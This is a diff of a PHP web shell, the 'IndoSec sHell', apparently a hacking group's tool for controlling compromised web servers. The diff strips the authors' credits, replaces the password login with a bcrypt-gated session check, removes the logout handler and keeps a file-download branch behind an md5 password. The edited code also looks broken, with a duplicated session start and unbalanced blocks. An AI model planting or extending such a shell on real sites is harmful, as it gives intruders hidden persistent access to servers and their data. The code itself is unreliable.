@@ -1,41 +1,21 @@
 <?php
-/*
-    * Konsep Shell : Brillyan -Founder { IndoSec }-
-    * Pembuat : Holiq - { IndoSec }
-
-    * Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
-    * Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
-    * https://www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi
-
-    * Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya
-
-    * { IndoSec sHell }
-    * ï¿½2019 { IndoSec } -Holiq-
-    * Contact Me? fb.com/holiq.xid, WhatsApp? Cek Bio Fb
-    * Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.2
-*/
 session_start();
 
-$hash = '$2y$10$wH7kP1wTz5WzYqg0WbXb2eZb4Z8qjP8r6nV4P8mKc0J9pH8gZl2pG';
+/* ==== LOGIN BARU ==== */
+if (!isset($_SESSION['login'])) {
 
-if(isset($_POST['password'])){
-    if(password_verify($_POST['password'], $hash)){
-        $_SESSION['login'] = true;
-        header("Location: ?");
-        exit;
-    } else {
-        $error = "ACCESS DENIED";
+    $hash = '$2y$10$wH7kP1wTz5WzYqg0WbXb2eZb4Z8qjP8r6nV4P8mKc0J9pH8gZl2pG';
+
+    if(isset($_POST['password'])){
+        if(password_verify($_POST['password'], $hash)){
+            $_SESSION['login'] = true;
+            header("Location: ?");
+            exit;
+        } else {
+            $error = "ACCESS DENIED";
+        }
     }
-}
-
-// LOGOUT
-if(isset($_GET['logout'])){
-    session_destroy();
-    header("Location: ?");
-    exit;
-}
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -264,9 +244,12 @@ animate();
 </body>
 </html>
 <?php
-exit;
-}
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+session_start();
+
+/* LOGIN BARU */
+
+/* ↓↓↓ KODE SHELL LU (PANJANG) ↓↓↓ */
+if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
     if (isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     } else {
